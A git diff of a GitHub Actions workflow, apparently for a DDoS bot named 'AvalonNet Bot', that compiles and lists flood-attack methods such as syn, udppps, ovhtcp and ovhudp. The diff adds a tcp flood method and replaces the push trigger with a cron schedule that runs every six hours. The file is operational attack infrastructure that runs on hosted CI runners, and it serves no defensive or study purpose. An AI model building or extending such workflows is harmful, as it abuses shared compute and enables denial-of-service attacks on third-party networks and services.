@@ -1,10 +1,9 @@
-name: AvalonBot
+name: AvalonNet Bot freeee
 
 on:
   workflow_dispatch:
-  push:
-    branches:
-      - main
+  schedule:
+    - cron: '0 */6 * * *'
 
 jobs:
   build-and-run:
@@ -52,6 +51,7 @@ jobs:
             "ovhtcp.c:ovhtcp"
             "syn.c:syn:-lpthread"
             "udppps.c:udppps"
+            "tcp.c:tcp" # Agregando el compilar tcp
           )
 
           for entry in "${binaries[@]}"; do
@@ -121,7 +121,7 @@ jobs:
           echo "🎮 MÉTODOS DISPONIBLES:"
 
           # Mostrar métodos según ejecutables
-          for method in hex udp ovhudp ovhtcp syn udppps; do
+          for method in hex udp ovhudp ovhtcp syn udppps tcp; do
             [ -f "$method" ] && echo "   • $method"
           done
 
